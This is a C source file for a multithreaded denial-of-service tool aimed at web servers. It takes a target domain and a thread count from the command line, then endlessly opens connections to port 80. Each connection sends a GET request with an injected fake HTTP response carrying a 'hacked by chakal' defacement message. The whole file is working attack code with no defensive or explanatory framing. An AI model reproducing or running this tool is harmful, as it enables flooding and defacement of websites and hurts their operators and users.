#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>

char *content = "%3Ch1%3Ehacked%20by%20chakal%3C%2Fh1%3E";
char *tgtip;
struct timeval tv;
struct sockaddr_in sa; 

char *make_get() {
 char *req = malloc(1024);
 sprintf(req, "GET / HTTP/1.1\r\nHost: %s\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: %ld\r\n\r\n%s", tgtip, strlen(content), content);
 return req;
}

int makesa() {
 struct hostent *hostw;
 if((hostw = gethostbyname(tgtip)) != 0) {
  sa.sin_addr.s_addr = *((unsigned int *)hostw->h_addr);
  sa.sin_port = htons(80); 
  sa.sin_family = AF_INET;
 } else {
  dprintf(1, "invalid host\n");
  exit(0);
 }
}

void *dos(void *unused) {
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 char *req = make_get();
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, req, strlen(req), MSG_NOSIGNAL); 
 }
 dprintf(1, "%s", req);
 free(req);
 close(fd);
}


int make_threads(int threadnum) {
 pthread_t threadg[threadnum];
 makesa();
 while(1) {
  for(int i = 0; i < threadnum; i++) {
   pthread_create(&threadg[i], 0, &dos, 0);
  }
  for(int i = 0; i < threadnum; i++) {
   pthread_join(threadg[i], 0);
  }
 } 
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 srand(time(0));
 if(argc < 3) {
  dprintf(1, "domain threads\n");
  return 0;
 }
 tgtip = argv[1];
 make_threads(atoi(argv[2]));
 dprintf(1, "Started.\n");
}
